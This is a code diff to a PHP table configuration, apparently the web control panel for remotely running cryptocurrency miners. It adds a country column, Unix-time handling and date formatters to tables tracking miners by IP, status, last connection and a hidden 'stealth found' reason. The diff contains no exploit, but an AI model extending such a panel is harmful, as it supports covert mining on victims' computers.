@@ -2,6 +2,8 @@
 /* Made by Unam Sanctam https://github.com/UnamSanctam */
 require_once 'templates.php';
 
+$countryNames = json_decode(file_get_contents(dirname(__DIR__, 2) . '/assets/json/countryNames.json'), true);
+
 $datatables = [
     'tables'=>[
         'miner-table'=>[
@@ -22,6 +24,14 @@ $datatables = [
                     'display'=>'IP'
                 ],
                 [
+                    'db_column'=>'ms_country',
+                    'display'=>'Country',
+                    'formatter'=>function($d){
+                        global $countryNames;
+                        return $countryNames[$d] ?? 'Unknown';
+                    }
+                ],
+                [
                     'db_column'=>'ms_stealthfound',
                     'hidden'=>true
                 ],
@@ -30,10 +40,10 @@ $datatables = [
                     'display'=>$larr['status'],
                     'formatter'=>function($d, $s){
                         global $larr;
-                        $offline = isset($s['ms_lastConnection']) && ((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])) > 180);
+                        $offline = isset($s['ms_lastConnection']) && (time() - $s['ms_lastConnection'] > 180);
                         $status = unamMinerStatus($offline ? -1 : (empty($s['ms_pool']) && $d != 6 ? 7 : $d));
                         if($offline) {
-                            $status .= '<span class="text-status-red">('.unamTimeFormat((strtotime(date("Y-m-d H:i:s")) - strtotime($s['ms_lastConnection'])), true).')</span>';
+                            $status .= '<span class="text-status-red">('.unamTimeFormat(time() - $s['ms_lastConnection'], true).')</span>';
                         }
                         if($d == 4) {
                             $status = str_replace('{REASON}', !empty($s['ms_stealthfound']) ? $s['ms_stealthfound'] : $larr['unknown'], $status);
@@ -130,10 +140,16 @@ $datatables = [
                 [
                     'db_column'=>'ms_lastConnection',
                     'display'=>$larr['last_connection'],
+                    'formatter'=>function($d){
+                        return date('Y-m-d H:i:s', $d);
+                    }
                 ],
                 [
                     'db_column'=>'ms_creationDate',
                     'display'=>$larr['first_connection'],
+                    'formatter'=>function($d){
+                        return date('Y-m-d H:i:s', $d);
+                    }
                 ],
                 [
                     'db_column'=>'ms_minerID',
@@ -189,7 +205,10 @@ $datatables = [
                 ],
                 [
                     'db_column'=>'ipb_datetime',
-                    'display'=>$larr['date']
+                    'display'=>$larr['date'],
+                    'formatter'=>function($d){
+                        return date('Y-m-d H:i:s', $d);
+                    }
                 ],
                 [
                     'db_column'=>'ipb_blockID',
